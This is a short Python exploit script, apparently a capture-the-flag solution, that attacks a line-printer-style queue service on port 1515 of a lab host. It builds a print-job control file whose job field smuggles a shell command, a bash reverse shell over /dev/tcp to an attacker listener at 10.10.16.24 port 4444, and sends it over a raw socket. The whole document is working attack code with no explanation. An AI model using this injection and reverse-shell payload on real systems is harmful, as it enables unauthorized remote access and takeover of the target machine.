#!/usr/bin/env python3

import socket
target = "10.129.150.60"
port = 1515
queue = "archive_intake"
lhost = "10.10.16.24"
lport = 4444 
payload = f"x'; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'; echo 'x"
control_file = f"Hpaperwork\nP0wned\nJ{payload}\n"
content = control_file.encode()
size = len(content)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b'\x02' + queue.encode() + b'\n')
print("[+] Queue Response:", s.recv(1024))

sub_chunk = bytes([0x02]) + f"{size} cfA001paperwork\n".encode()
s.send(sub_chunk)
print("[+] Subcommand ack:", s.recv(1024))

s.send(content)
print("[+] Final Response:", s.recv(4096))
s.close()
